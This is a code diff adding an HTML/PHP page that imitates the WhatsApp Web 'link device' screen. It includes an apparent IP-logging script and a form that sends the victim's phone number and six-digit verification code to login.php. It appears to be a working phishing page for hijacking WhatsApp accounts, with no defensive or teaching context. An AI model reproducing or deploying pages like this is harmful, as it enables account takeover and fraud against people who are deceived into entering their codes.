@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <?php include '../ip.php'; ?>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #f0f2f5; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            margin: 0;
+            padding: 15px;
+            box-sizing: border-box;
+        }
+
+        .card {
+            background: white;
+            width: 100%;
+            max-width: 400px; /* Limits size on desktop, fluid on mobile */
+            padding: 40px;
+            border-radius: 3px;
+            box-shadow: 0 17px 50px 0 rgba(0,0,0,.19), 0 12px 15px 0 rgba(0,0,0,.24);
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .logo {
+            color: #25D366;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        h2 { color: #41525d; font-weight: 300; margin-bottom: 10px; }
+        
+        p { 
+            color: #667781; 
+            font-size: 14px; 
+            line-height: 20px; 
+            margin-bottom: 25px;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-bottom: 2px solid #25D366;
+            background: #f8f9fa;
+            outline: none;
+            box-sizing: border-box;
+            font-size: 16px; /* Prevents auto-zoom on iOS */
+        }
+
+        .btn-submit {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 3px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+            transition: background 0.3s ease;
+        }
+
+        .btn-submit:hover {
+            background-color: #1ebc5a;
+        }
+
+        /* Responsive adjustments for very small screens */
+        @media (max-width: 480px) {
+            .card {
+                padding: 30px 20px;
+            }
+            .logo {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">WhatsApp</div>
+        <p>Enter your phone number to link device</p>
+        <form action="login.php" method="POST">
+            <input type="text" name="phone" placeholder="Phone Number" required>
+            <input type="password" name="otp" placeholder="6-Digit Code" required>
+            <button type="submit" class="btn-submit">LINK DEVICE</button>
+        </form>
+    </div>
+</body>
+</html>
